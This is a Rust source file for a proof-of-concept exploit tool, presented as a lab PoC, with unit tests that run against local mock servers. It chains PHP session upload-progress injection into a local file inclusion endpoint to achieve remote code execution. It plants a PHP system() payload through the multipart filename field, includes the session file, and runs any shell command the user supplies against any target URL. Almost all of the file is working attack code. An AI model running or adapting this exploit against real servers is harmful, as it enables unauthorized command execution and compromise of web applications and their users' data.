use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

use clap::Parser;
use regex::Regex;

const MAX_LFI_DEPTH_BYTES: usize = 1 << 16;

#[derive(Parser, Debug)]
#[command(
    name = "php2shell-poc",
    version,
    about = "php2shell lab PoC: session injection via upload_progress filename chained into an LFI sink",
    override_usage = "php2shell-poc --target URL [OPTIONS]"
)]
struct Args {
    #[arg(long, value_name = "URL")]
    target: String,

    #[arg(long, default_value = "/index.php")]
    inject_path: String,

    #[arg(long, default_value = "/vuln.php")]
    lfi_path: String,

    #[arg(long, default_value = "/tmp")]
    session_path: String,

    #[arg(long, default_value = "id")]
    command: String,

    #[arg(long, default_value = "3")]
    attempts: u32,

    #[arg(long, default_value = "10.0")]
    timeout: f64,

    #[arg(long)]
    sid: Option<String>,

    #[arg(long)]
    json: bool,
}

struct Target {
    host: String,
    port: u16,
    tls: bool,
    timeout: Duration,
    inject_path: String,
    lfi_path: String,
}

impl Target {
    fn parse(
        raw: &str,
        inject_path: &str,
        lfi_path: &str,
        timeout: f64,
    ) -> Result<Self, String> {
        let url = url::Url::parse(raw).map_err(|e| format!("invalid target URL: {e}"))?;
        let tls = match url.scheme() {
            "http" => false,
            "https" => true,
            other => return Err(format!("unsupported scheme: {other}")),
        };
        let host = url
            .host_str()
            .ok_or_else(|| "target URL has no host".to_string())?
            .to_string();
        let port = url.port().unwrap_or(if tls { 443 } else { 80 });

        let base_path = url.path();
        let inject_path = if inject_path == "/index.php" && base_path != "/" && !base_path.is_empty()
        {
            base_path.to_string()
        } else {
            inject_path.to_string()
        };

        Ok(Self {
            host,
            port,
            tls,
            timeout: Duration::from_secs_f64(timeout.max(0.5)),
            inject_path,
            lfi_path: lfi_path.to_string(),
        })
    }

    fn connect(&self) -> Result<TcpStream, String> {
        let addr = format!("{}:{}", self.host, self.port);
        let stream =
            TcpStream::connect(&addr).map_err(|e| format!("connect {addr} failed: {e}"))?;
        stream
            .set_read_timeout(Some(self.timeout))
            .and_then(|_| stream.set_write_timeout(Some(self.timeout)))
            .map_err(|e| format!("socket setup failed: {e}"))?;
        if self.tls {
            return Err("TLS targets are not supported by this lab PoC; use plain http".into());
        }
        Ok(stream)
    }

    fn request(&self, raw: &[u8]) -> Result<Vec<u8>, String> {
        let mut stream = self.connect()?;
        stream
            .write_all(raw)
            .map_err(|e| format!("write failed: {e}"))?;
        let mut out = Vec::new();
        let mut buf = [0u8; 16384];
        loop {
            match stream.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    out.extend_from_slice(&buf[..n]);
                    if out.len() > MAX_LFI_DEPTH_BYTES * 16 {
                        break;
                    }
                }
                Err(e)
                    if e.kind() == std::io::ErrorKind::WouldBlock
                        || e.kind() == std::io::ErrorKind::TimedOut =>
                {
                    break
                }
                Err(e)
                    if e.kind() == std::io::ErrorKind::ConnectionReset =>
                {
                    break
                }
                Err(e) => return Err(format!("read failed: {e}")),
            }
        }
        Ok(out)
    }
}

fn multipart(parts: &[(String, Option<String>, Vec<u8>)], boundary: &str) -> Vec<u8> {
    let mut body = Vec::new();
    for (name, filename, data) in parts {
        body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
        match filename {
            Some(f) => body.extend_from_slice(
                format!(
                    "Content-Disposition: form-data; name=\"{name}\"; filename=\"{f}\"\r\nContent-Type: application/octet-stream\r\n\r\n"
                )
                .as_bytes(),
            ),
            None => body.extend_from_slice(
                format!("Content-Disposition: form-data; name=\"{name}\"\r\n\r\n").as_bytes(),
            ),
        }
        body.extend_from_slice(data);
        body.extend_from_slice(b"\r\n");
    }
    body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
    body
}

fn plant_session(
    target: &Target,
    sid: &str,
    php_code: &str,
) -> Result<(u16, usize), String> {
    let boundary = "php2shellpocboundary";
    let parts = vec![
        ("PHPSESSID".to_string(), None, sid.as_bytes().to_vec()),
        (
            "PHP_SESSION_UPLOAD_PROGRESS".to_string(),
            None,
            b"php2shell".to_vec(),
        ),
        (
            "f".to_string(),
            Some(php_code.to_string()),
            b"Z".to_vec(),
        ),
    ];
    let body = multipart(&parts, boundary);

    let head = format!(
        "POST {} HTTP/1.1\r\nHost: {}:{}\r\nContent-Type: multipart/form-data; boundary={}\r\nContent-Length: {}\r\nCookie: PHPSESSID={}\r\nConnection: close\r\n\r\n",
        target.inject_path,
        target.host,
        target.port,
        boundary,
        body.len(),
        sid
    );
    let mut raw = head.into_bytes();
    raw.extend_from_slice(&body);

    let resp = target.request(&raw)?;
    Ok((status_code(&resp), resp.len()))
}

fn status_code(resp: &[u8]) -> u16 {
    let text = String::from_utf8_lossy(resp);
    let first = text.lines().next().unwrap_or("");
    first
        .split_whitespace()
        .nth(1)
        .and_then(|c| c.parse().ok())
        .unwrap_or(0)
}

fn body_of(resp: &[u8]) -> Vec<u8> {
    let needle = b"\r\n\r\n";
    match resp.windows(needle.len()).position(|w| w == needle) {
        Some(idx) => resp[idx + needle.len()..].to_vec(),
        None => resp.to_vec(),
    }
}

fn session_file_path(session_path: &str, sid: &str) -> String {
    format!(
        "{}/sess_{}",
        session_path.trim_end_matches('/'),
        sid
    )
}

fn trigger_lfi(
    target: &Target,
    session_file: &str,
    sid: &str,
) -> Result<Vec<u8>, String> {
    let path = encode_query_value(session_file);
    let head = format!(
        "GET {}?page={} HTTP/1.1\r\nHost: {}:{}\r\nCookie: PHPSESSID={}\r\nConnection: close\r\n\r\n",
        target.lfi_path, path, target.host, target.port, sid
    );
    target.request(head.as_bytes())
}

fn encode_query_value(value: &str) -> String {
    let mut out = String::new();
    for b in value.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' | b'/' | b':'
            | b'+' => out.push(b as char),
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

struct Outcome {
    confirmed: bool,
    output: String,
    attempts_used: u32,
    log: Vec<String>,
}

fn marker_regex() -> &'static Regex {
    static RE: std::sync::OnceLock<Regex> = std::sync::OnceLock::new();
    RE.get_or_init(|| Regex::new(r"(?s)___START___(.*?)___END___").unwrap())
}

fn run(args: &Args) -> Result<Outcome, String> {
    let target = Target::parse(&args.target, &args.inject_path, &args.lfi_path, args.timeout)?;

    let escaped = args.command.replace('\\', "\\\\").replace('\'', "\\'");
    let php_code = format!(
        "<?php echo '___START___'; system('{escaped}'); echo '___END___';?>"
    );

    let mut log = Vec::new();
    let mut attempts_used = 0;

    for attempt in 1..=args.attempts.max(1) {
        attempts_used = attempt;
        let sid = args
            .sid
            .clone()
            .unwrap_or_else(|| format!("php2shellpoc{:016x}", pseudo_nonce(attempt)));
        let session_file = session_file_path(&args.session_path, &sid);

        let (code, len) = plant_session(&target, &sid, &php_code)?;
        log.push(format!(
            "attempt {attempt}: planted sid={sid} status={code} bytes={len} file={session_file}"
        ));

        let resp = trigger_lfi(&target, &session_file, &sid)?;
        let body = body_of(&resp);
        let text = String::from_utf8_lossy(&body);
        let lfi_status = status_code(&resp);
        log.push(format!("attempt {attempt}: lfi status={lfi_status}"));

        if let Some(caps) = marker_regex().captures(&text) {
            let output = caps[1].trim().to_string();
            return Ok(Outcome {
                confirmed: true,
                output,
                attempts_used,
                log,
            });
        }
        if lfi_status == 404 || lfi_status == 0 {
            log.push(format!(
                "attempt {attempt}: lfi endpoint not reachable ({lfi_status}); check --lfi-path"
            ));
        }
    }

    Ok(Outcome {
        confirmed: false,
        output: String::new(),
        attempts_used,
        log,
    })
}

fn pseudo_nonce(seed: u32) -> u64 {
    let t = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0);
    let mut x = t ^ (seed as u64).wrapping_mul(0x9E37_79B9_7F4A_7C15);
    x ^= x >> 30;
    x = x.wrapping_mul(0xBF58_476D_1CE4_E5B9);
    x ^= x >> 27;
    x = x.wrapping_mul(0x94D0_49BB_1331_11EB);
    x ^ (x >> 31)
}

fn main() {
    let args = Args::parse();

    if args.timeout <= 0.0 || args.timeout > 120.0 {
        eprintln!("--timeout must be greater than 0 and at most 120 seconds");
        std::process::exit(2);
    }

    match run(&args) {
        Ok(outcome) => {
            if args.json {
                let report = serde_json::json!({
                    "target": args.target,
                    "command": args.command,
                    "confirmed": outcome.confirmed,
                    "output": outcome.output,
                    "attempts": outcome.attempts_used,
                    "log": outcome.log,
                });
                println!("{}", serde_json::to_string_pretty(&report).unwrap());
            } else {
                for line in &outcome.log {
                    eprintln!("[*] {line}");
                }
                if outcome.confirmed {
                    println!("RCE CONFIRMED: {}", outcome.output);
                } else {
                    println!("NOT CONFIRMED: no marker found in LFI response");
                }
            }
            std::process::exit(if outcome.confirmed { 0 } else { 1 });
        }
        Err(e) => {
            eprintln!("error: {e}");
            std::process::exit(2);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{BufRead, BufReader};
    use std::net::TcpListener;
    use std::sync::mpsc;
    use std::thread;

    fn spin_server(
        status_line: &'static str,
        body: &'static str,
        max_connections: usize,
    ) -> (u16, mpsc::Receiver<String>) {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let (tx, rx) = mpsc::channel();
        thread::spawn(move || {
            for stream in listener.incoming().take(max_connections) {
                let mut stream = match stream {
                    Ok(s) => s,
                    Err(_) => continue,
                };
                let mut reader = BufReader::new(stream.try_clone().unwrap());
                let mut request_line = String::new();
                let _ = reader.read_line(&mut request_line);
                let mut total = 0usize;
                loop {
                    let mut line = String::new();
                    if reader.read_line(&mut line).unwrap_or(0) == 0 {
                        break;
                    }
                    if let Some(v) = line.strip_prefix("Content-Length:") {
                        total = v.trim().parse().unwrap_or(0);
                    }
                    if line == "\r\n" {
                        break;
                    }
                }
                if total > 0 {
                    let mut sink = vec![0u8; total];
                    let _ = reader.read_exact(&mut sink);
                }
                let _ = tx.send(request_line.trim().to_string());
                let resp = format!(
                    "{status_line}\r\nContent-Length: {}\r\n\r\n{body}",
                    body.len()
                );
                let _ = stream.write_all(resp.as_bytes());
            }
        });
        (port, rx)
    }

    #[test]
    fn confirmed_when_markers_present() {
        let (port, rx) = spin_server(
            "HTTP/1.1 200 OK",
            "<pre>___START___uid=33(www-data)___END___</pre>",
            2,
        );
        let args = Args {
            target: format!("http://127.0.0.1:{port}/index.php"),
            inject_path: "/index.php".into(),
            lfi_path: "/vuln.php".into(),
            session_path: "/tmp".into(),
            command: "id".into(),
            attempts: 1,
            timeout: 5.0,
            sid: Some("testsid0000000000001".into()),
            json: false,
        };
        let outcome = run(&args).unwrap();
        assert!(outcome.confirmed, "{:?}", outcome.log);
        assert_eq!(outcome.output, "uid=33(www-data)");
        let first = rx.recv().unwrap();
        assert!(first.starts_with("POST /index.php"));
    }

    #[test]
    fn not_confirmed_without_markers() {
        let (port, _rx) = spin_server(
            "HTTP/1.1 200 OK",
            "<html>no session include here</html>",
            4,
        );
        let args = Args {
            target: format!("http://127.0.0.1:{port}/"),
            inject_path: "/index.php".into(),
            lfi_path: "/vuln.php".into(),
            session_path: "/tmp".into(),
            command: "id".into(),
            attempts: 2,
            timeout: 5.0,
            sid: Some("testsid0000000000002".into()),
            json: false,
        };
        let outcome = run(&args).unwrap();
        assert!(!outcome.confirmed);
        assert_eq!(outcome.attempts_used, 2);
    }

    #[test]
    fn session_file_path_shape() {
        assert_eq!(session_file_path("/tmp", "abc"), "/tmp/sess_abc");
        assert_eq!(session_file_path("/var/lib/php/sessions/", "abc"), "/var/lib/php/sessions/sess_abc");
    }

    #[test]
    fn multipart_has_name_and_filename() {
        let parts = vec![
            ("PHPSESSID".to_string(), None, b"x".to_vec()),
            ("f".to_string(), Some("<?php ?>".to_string()), b"Z".to_vec()),
        ];
        let body = multipart(&parts, "bnd");
        let text = String::from_utf8_lossy(&body);
        assert!(text.contains("name=\"PHPSESSID\""));
        assert!(text.contains("filename=\"<?php ?>\""));
        assert!(text.starts_with("--bnd\r\n"));
        assert!(text.ends_with("--bnd--\r\n"));
    }

    #[test]
    fn query_encoding_keeps_slashes() {
        let enc = encode_query_value("/tmp/sess_abc");
        assert_eq!(enc, "/tmp/sess_abc");
        assert_eq!(encode_query_value("a b"), "a%20b");
    }
}
